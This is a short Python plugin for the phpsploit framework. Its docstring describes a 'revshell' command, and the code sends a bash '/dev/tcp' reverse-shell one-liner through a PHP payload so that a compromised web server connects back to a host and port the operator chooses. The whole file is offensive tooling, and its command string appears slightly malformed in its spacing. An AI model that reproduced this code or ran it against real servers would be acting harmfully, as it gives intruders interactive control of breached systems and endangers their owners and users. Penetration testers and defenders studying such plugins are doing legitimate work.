"""Bash reverse shell for phpsploit

SYNOPSIS:
    revshell [HOST] [PORT]

EXAMPLES:
    > revshell 1.1.1.1 5566
      - Creates a reverse shell to 1.1.1.1 on port 5566

DESCRIPTION:
    Connect phpsploit to a listening port on your defined
    host to provide a reverse shell using bash.

AUTHOR:
    tj <https://github.com/exssh>
"""
import sys

from api import plugin
from api import server

if len(plugin.argv) != 3:
    sys.exit(plugin.help)

listen_host = plugin.argv[1]
listen_port = plugin.argv[2]

payload = server.payload.Payload("payload.php")
payload['CMD'] = "$(which bash)-c 'TERM=xterm-256color $(which bash) -i >& /dev/tcp/" + listen_host + "/" + listen_port +"0>&1'"
output = payload.send()
print(output)
